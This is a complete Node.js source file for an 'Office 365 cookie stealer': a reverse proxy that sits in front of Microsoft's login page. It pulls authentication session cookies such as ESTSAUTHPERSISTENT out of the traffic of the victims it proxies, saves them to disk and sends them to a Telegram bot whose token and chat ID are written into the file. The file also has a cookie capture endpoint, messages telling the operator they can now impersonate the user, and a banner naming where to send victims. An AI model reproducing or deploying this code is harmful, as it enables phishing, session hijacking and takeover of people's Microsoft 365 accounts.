// =============================================
// OFFICE 365 COOKIE STEALER - REVERSE PROXY (FIXED)
// =============================================

const express = require('express');
const { createProxyMiddleware } = require('http-proxy-middleware');
const fs = require('fs-extra');
const path = require('path');
const cors = require('cors');
const fetch = require('node-fetch');
const app = express();
const PORT = process.env.PORT || 3000;

// =============================================
// ⚠️ CONFIGURATION - UPDATE THESE!
// =============================================
const CONFIG = {
    botToken: '8730465777:AAHmQqHT-aPYbAtxItqtDSAtoeGhcXIv-4g',
    chatId: '7075480337'
};

// =============================================
// MIDDLEWARE
// =============================================
app.use(cors());
app.use(express.json({ limit: '100mb' }));
app.use(express.static('public'));

// =============================================
// CREATE STORAGE
// =============================================
const STORAGE_DIR = './captured_sessions';
fs.ensureDirSync(STORAGE_DIR);
console.log(`✅ Storage created: ${STORAGE_DIR}/`);

// =============================================
// TELEGRAM SENDER
// =============================================
async function sendToTelegram(message, fileData = null) {
    try {
        console.log('📤 Sending to Telegram...');
        
        const textResponse = await fetch(
            `https://api.telegram.org/bot${CONFIG.botToken}/sendMessage`,
            {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CONFIG.chatId,
                    text: message,
                    parse_mode: 'HTML'
                })
            }
        );
        
        const textResult = await textResponse.text();
        console.log('📤 Text response:', textResult.substring(0, 200));
        
        if (fileData) {
            const FormData = require('form-data');
            const formData = new FormData();
            formData.append('chat_id', CONFIG.chatId);
            formData.append(
                'document',
                JSON.stringify(fileData, null, 2),
                `session_${Date.now()}.json`
            );
            formData.append('caption', '📸 Captured Session Data - Office 365');
            
            const fileResponse = await fetch(
                `https://api.telegram.org/bot${CONFIG.botToken}/sendDocument`,
                {
                    method: 'POST',
                    body: formData
                }
            );
            
            const fileResult = await fileResponse.text();
            console.log('📤 File response:', fileResult.substring(0, 200));
        }
        
        console.log('✅ Telegram sent successfully!');
        return true;
        
    } catch (error) {
        console.error('❌ Telegram error:', error.message);
        return false;
    }
}

// =============================================
// EXTRACT COOKIES
// =============================================
function extractCookies(headers) {
    const cookieHeader = headers['cookie'] || headers['Cookie'] || '';
    const cookies = {};
    
    if (cookieHeader) {
        const parts = cookieHeader.split(';');
        for (const part of parts) {
            const trimmed = part.trim();
            if (trimmed) {
                const [name, ...valueParts] = trimmed.split('=');
                cookies[name] = valueParts.join('=');
            }
        }
    }
    
    return cookies;
}

// =============================================
// EXTRACT OFFICE 365 COOKIES
// =============================================
function extractOfficeCookies(cookies) {
    const officeCookies = {};
    const targetNames = [
        'ESTSAUTHPERSISTENT',
        'ESTSAUTH',
        'ESTSAUTHLIGHT',
        'SignInState',
        'SignInPolicy',
        'LoginOptions',
        'MSTeams',
        'MSA',
        'AAD',
        'Microsoft',
        'Office',
        'Outlook',
        'SharePoint',
        'x-ms-gateway-slice',
        'stsservicecookie',
        'msal',
        'clientid',
        'login_hint'
    ];
    
    for (const [name, value] of Object.entries(cookies)) {
        for (const target of targetNames) {
            if (name.includes(target) || name.toUpperCase().includes(target.toUpperCase())) {
                officeCookies[name] = value;
                break;
            }
        }
    }
    
    return officeCookies;
}

// =============================================
// ✅ FIXED: PROXY MIDDLEWARE - CORRECT TARGET
// =============================================
const proxyMiddleware = createProxyMiddleware({
    // ✅ CORRECT: Send to the root of Microsoft login
    target: 'https://login.microsoftonline.com',
    changeOrigin: true,
    secure: true,
    ws: true,
    cookieDomainRewrite: {
        '*': ''
    },
    pathRewrite: {
        '^/proxy': '/'  // ← THIS IS KEY! Removes /proxy from the path
    },
    onProxyReq: (proxyReq, req, res) => {
        console.log('\n🎯 PROXY REQUEST RECEIVED');
        console.log('🌐 Original URL:', req.url);
        console.log('📌 Method:', req.method);
        
        // Log the request being forwarded
        console.log('📤 Forwarding to:', proxyReq.path);
        
        const cookieHeader = proxyReq.getHeader('cookie') || req.headers.cookie || '';
        
        if (cookieHeader) {
            console.log('🍪 Cookies in request:', cookieHeader.substring(0, 200) + '...');
            
            const cookies = extractCookies({ cookie: cookieHeader });
            const officeCookies = extractOfficeCookies(cookies);
            const hasFullSession = cookies['ESTSAUTHPERSISTENT'] || cookies['ESTSAUTH'];
            
            console.log(`🍪 Total cookies: ${Object.keys(cookies).length}`);
            console.log(`🎯 Office cookies: ${Object.keys(officeCookies).length}`);
            
            if (hasFullSession) {
                console.log('🔥 FULL OFFICE 365 SESSION CAPTURED IN PROXY!');
            }
            
            const timestamp = new Date().toISOString();
            const sessionData = {
                timestamp: timestamp,
                method: 'PROXY',
                url: req.url,
                cookies: cookies,
                officeCookies: officeCookies,
                hasFullSession: hasFullSession,
                ip: req.ip || req.connection.remoteAddress,
                userAgent: req.headers['user-agent'] || 'unknown'
            };
            
            const filename = `session_proxy_${Date.now()}.json`;
            fs.writeJsonSync(path.join(STORAGE_DIR, filename), sessionData, { spaces: 2 });
            console.log(`📁 Saved: ${filename}`);
            
            if (Object.keys(officeCookies).length > 0 || hasFullSession) {
                console.log('📤 Sending Office cookies to Telegram...');
                
                let message = '🎯 <b>PROXY CAPTURE - Office 365!</b>\n\n';
                message += `📅 <b>Time:</b> ${timestamp}\n`;
                message += `🌐 <b>URL:</b> ${req.url}\n`;
                message += `🖥️ <b>User-Agent:</b> ${(req.headers['user-agent'] || 'Unknown').substring(0, 80)}...\n\n`;
                message += `🍪 <b>Total Cookies:</b> ${Object.keys(cookies).length}\n`;
                message += `🎯 <b>Office Cookies:</b> ${Object.keys(officeCookies).length}\n`;
                
                if (hasFullSession) {
                    message += '\n🔥 <b>FULL OFFICE 365 SESSION CAPTURED!</b>\n';
                    message += '✅ You can now impersonate this user!\n\n';
                }
                
                if (Object.keys(officeCookies).length > 0) {
                    message += '\n🔑 <b>Critical Office Cookies:</b>\n';
                    for (const [name, value] of Object.entries(officeCookies)) {
                        const shortValue = value.length > 40 ? value.substring(0, 40) + '...' : value;
                        message += `• ${name}: ${shortValue}\n`;
                    }
                }
                
                sendToTelegram(message, sessionData).catch(console.error);
            } else {
                console.log('❌ No Office cookies found in proxy request.');
            }
        } else {
            console.log('❌ No cookies in proxy request');
        }
    },
    onProxyRes: (proxyRes, req, res) => {
        const setCookie = proxyRes.headers['set-cookie'];
        if (setCookie) {
            console.log('\n🍪 MICROSOFT SET COOKIES:');
            console.log(setCookie.join('\n'));
            
            // Extract cookies from set-cookie
            const cookies = {};
            for (const cookie of setCookie) {
                const [name, ...valueParts] = cookie.split('=');
                if (name && valueParts) {
                    cookies[name] = valueParts.join('=').split(';')[0];
                }
            }
            
            // Send to Telegram
            const message = '🍪 <b>New Cookies from Microsoft!</b>\n\n' +
                setCookie.map(c => `• ${c.substring(0, 100)}...`).join('\n');
            sendToTelegram(message).catch(console.error);
            
            const officeCookies = extractOfficeCookies(cookies);
            if (Object.keys(officeCookies).length > 0) {
                const sessionData = {
                    timestamp: new Date().toISOString(),
                    method: 'SET_COOKIE',
                    cookies: cookies,
                    officeCookies: officeCookies,
                    hasFullSession: cookies['ESTSAUTHPERSISTENT'] || cookies['ESTSAUTH']
                };
                
                const filename = `session_setcookie_${Date.now()}.json`;
                fs.writeJsonSync(path.join(STORAGE_DIR, filename), sessionData, { spaces: 2 });
                console.log(`📁 Saved set-cookie: ${filename}`);
            }
        }
    },
    onError: (err, req, res) => {
        console.error('❌ Proxy error:', err.message);
        res.status(500).send('Proxy error occurred');
    }
});

// =============================================
// ✅ FIXED: PROXY ROUTE - Handles all paths
// =============================================
// This catches /proxy, /proxy/, /proxy/anything
app.use('/proxy', (req, res, next) => {
    console.log('\n🎯 PROXY ACCESS');
    console.log('📍 Client IP:', req.ip || req.connection.remoteAddress);
    console.log('🌐 Full URL:', req.url);
    console.log('🌐 Original URL:', req.originalUrl);
    next();
});

app.use('/proxy', proxyMiddleware);

// =============================================
// Also handle /proxy/ (with trailing slash)
// =============================================
app.get('/proxy/', (req, res) => {
    // Redirect to /proxy (without slash) so it works properly
    res.redirect('/proxy');
});

// =============================================
// CAPTURE ENDPOINT
// =============================================
app.post('/capture', async (req, res) => {
    console.log('\n🎯 POST COOKIE CAPTURED!');
    
    const data = req.body;
    const timestamp = new Date().toISOString();
    
    const cookies = extractCookies(req.headers);
    
    if (data.cookies && typeof data.cookies === 'object') {
        for (const [key, value] of Object.entries(data.cookies)) {
            if (!cookies[key]) {
                cookies[key] = value;
            }
        }
    }
    
    const officeCookies = extractOfficeCookies(cookies);
    const hasFullSession = cookies['ESTSAUTHPERSISTENT'] || cookies['ESTSAUTH'];
    
    console.log(`🍪 Total cookies: ${Object.keys(cookies).length}`);
    console.log(`🎯 Office cookies: ${Object.keys(officeCookies).length}`);
    
    if (hasFullSession) {
        console.log('🔥 FULL OFFICE 365 SESSION CAPTURED!');
    }
    
    const sessionData = {
        timestamp: timestamp,
        method: 'POST',
        url: data.url || req.headers.referer || 'unknown',
        userAgent: req.headers['user-agent'] || 'unknown',
        ip: req.ip || req.connection.remoteAddress,
        cookies: cookies,
        officeCookies: officeCookies,
        hasFullSession: hasFullSession,
        rawData: data
    };
    
    const filename = `session_post_${Date.now()}.json`;
    fs.writeJsonSync(path.join(STORAGE_DIR, filename), sessionData, { spaces: 2 });
    console.log(`📁 Saved: ${filename}`);
    
    if (Object.keys(cookies).length > 0) {
        console.log('📤 Sending to Telegram...');
        
        let message = '🎯 <b>POST Cookie Capture!</b>\n\n';
        message += `📅 <b>Time:</b> ${timestamp}\n`;
        message += `🌐 <b>URL:</b> ${data.url || req.headers.referer || 'Unknown'}\n`;
        message += `🖥️ <b>User-Agent:</b> ${(req.headers['user-agent'] || 'Unknown').substring(0, 80)}...\n\n`;
        message += `🍪 <b>Total Cookies:</b> ${Object.keys(cookies).length}\n`;
        message += `🎯 <b>Office Cookies:</b> ${Object.keys(officeCookies).length}\n`;
        
        if (hasFullSession) {
            message += '\n🔥 <b>FULL OFFICE 365 SESSION CAPTURED!</b>\n';
        }
        
        if (Object.keys(cookies).length > 0) {
            message += '\n📋 <b>All Cookies:</b>\n';
            let count = 0;
            for (const [name, value] of Object.entries(cookies)) {
                if (count < 20) {
                    const shortValue = value.length > 40 ? value.substring(0, 40) + '...' : value;
                    message += `• ${name}: ${shortValue}\n`;
                    count++;
                } else {
                    message += `• ... and ${Object.keys(cookies).length - 20} more\n`;
                    break;
                }
            }
        }
        
        await sendToTelegram(message, sessionData);
        
    } else {
        console.log('❌ No cookies found. Nothing sent to Telegram.');
    }
    
    res.json({
        success: true,
        captured: Object.keys(cookies).length,
        officeCookies: Object.keys(officeCookies).length,
        hasFullSession: hasFullSession
    });
});

// =============================================
// LANDING PAGE
// =============================================
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// =============================================
// INJECTOR PAGE
// =============================================
app.get('/injector.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'injector.html'));
});

// =============================================
// START SERVER
// =============================================
app.listen(PORT, () => {
    console.log(`
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║   🔥 OFFICE 365 REVERSE PROXY STEALER                     ║
║   🎯 Running on Railway!                                   ║
║                                                              ║
║   📡 Port: ${PORT}                                           ║
║   📁 Captures: ${STORAGE_DIR}/                              ║
║                                                              ║
║   📌 SEND VICTIM TO:                                       ║
║   🔗 https://your-railway-url/proxy                        ║
║                                                              ║
║                                                              ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
    `);
});

module.exports = { app };
